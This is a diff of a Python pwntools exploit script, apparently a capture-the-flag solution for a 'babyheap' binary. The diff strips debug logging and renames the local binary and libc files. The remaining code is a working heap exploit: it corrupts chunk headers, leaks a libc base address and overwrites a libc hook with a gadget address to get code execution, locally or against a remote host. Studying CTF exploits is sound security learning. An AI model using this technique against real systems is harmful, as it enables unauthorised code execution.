@@ -35,15 +35,10 @@ def exploit(r):
     r.recvuntil(': ')
 
     alloc(0x20)
-    logging.info('[0]%s'%(dump(0)))
     alloc(0x20)
-    logging.info('[1]%s'%(dump(1)))
     alloc(0x20)
-    logging.info('[2]%s'%(dump(2)))
     alloc(0x20)
-    logging.info('[3]%s'%(dump(3)))
     alloc(0x80)
-    logging.info('[4]%s'%(dump(4)))
 
     free(1)
     free(2)
@@ -60,40 +55,30 @@ def exploit(r):
     fill(3, payload)
 
     alloc(0x20)
-    logging.info('[1]%s'%(dump(1)))
     alloc(0x20)
-    logging.info('[2]%s'%(dump(2)))
 
 
     payload  = p64(0)*5
     payload += p64(0x91)
     fill(3, payload)
     alloc(0x80)
-    logging.info('[5]%s'%(dump(5)))
-    logging.info('[2]%s'%(dump(2)))
     free(4)
-    logging.info('[2]%s'%(dump(2)))
 
     libc_base = u64(dump(2)[:8]) - 0x3a5678
     log.info("libc_base: " + hex(libc_base))
 
     alloc(0x68)
-    logging.info('[4]%s'%(dump(4)))
     free(4)
 
     fill(2, p64(libc_base + 0x3a55ed))
     alloc(0x60)
-    logging.info('[4]%s'%(dump(4)))
     alloc(0x60)
-    logging.info('[6]%s'%(dump(6)))
-    logging.info('[5]%s'%(dump(5)))
 
     payload  = '\x00'*3
     payload += p64(0)*2
     payload += p64(libc_base + 0x41374)
     fill(6, payload)
-    logging.info('[6]%s'%(dump(6)))
-    log.info('before the memory dump')
+    log.info('wait for pause')
     pause()
     alloc(255)
 
@@ -107,7 +92,7 @@ if __name__ == "__main__":
         r = remote(sys.argv[1], int(sys.argv[2]))
         exploit(r)
     else:
-        r = process(['./babyheap'], env={"LD_PRELOAD":"./libc.so.6"})
+        r = process(['./babyheap_69a42acd160ab67a68047ca3f9c390b9'], env={"LD_PRELOAD":"./libc.so.6_b86ec517ee44b2d6c03096e0518c72a1"})
         print util.proc.pidof(r)
         pause()
         exploit(r)
